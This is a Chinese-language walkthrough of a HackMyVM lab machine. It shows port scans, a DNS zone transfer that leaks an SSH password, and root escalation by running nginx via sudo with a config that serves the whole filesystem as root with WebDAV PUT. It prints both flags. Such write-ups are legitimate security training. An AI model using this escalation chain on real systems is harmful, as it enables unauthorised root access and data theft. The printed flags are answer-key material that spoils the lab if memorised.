### 端口扫描

```bash
nmap -sT --min-rate 10000 -p- 192.168.56.116
```

```
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 08:00:27:E1:CB:80 (Oracle VirtualBox virtual NIC)
```

```bash
nmap -sT -sC -sV -O -p22,53,80 192.168.56.116
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7e:d2:d5:d0:45:36:d7:c9:ed:3e:1d:5c:86:fb:e4 (RSA)
|   256 04:9d:9a:de:af:31:33:1c:7c:24:4a:97:38:76:f5:f7 (ECDSA)
|_  256 b0:8c:ed:ea:13:0f:03:2a:f3:60:8a:c3:ba:68:4a:be (ED25519)
53/tcp open  domain  (unknown banner: not currently available)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|     bind
|_    currently available
| dns-nsid: 
|_  bind.version: not currently available
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
```

### web端渗透

![image-20241015174005737](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241015174005737.png)

编辑hosts文件，做一个域名解析

```
192.168.56.116 webmaster.hmv
```

### 探测 DNS 服务

```bash
dig axfr @192.168.56.116 webmaster.hmv
```

有一条TXT记录

```
john.webmaster.hmv.     604800  IN      TXT     "Myhiddenpazzword"
```

### SSH登录

```bash
ssh john@192.168.56.116
```

密码是：`Myhiddenpazzword`

### 提权

```bash
john@webmaster:~$ sudo -l
Matching Defaults entries for john on webmaster:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on webmaster:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

`nginx`提权

编写配置文件，将根目录映射出来

```nginx
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
        server {
                listen 1339;
                root /;
                autoindex on;
                dav_methods PUT;
        }
}
```

```bash
sudo /usr/sbin/nginx -c /home/john/1.conf
```

访问HTTP服务，1339端口

![image-20241016222105462](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241016222105462.png)

成功将整个系统文件映射出来

#### user's flag

```
HMVdnsyo
```

#### root's flag

```
HMVnginxpwnd
```

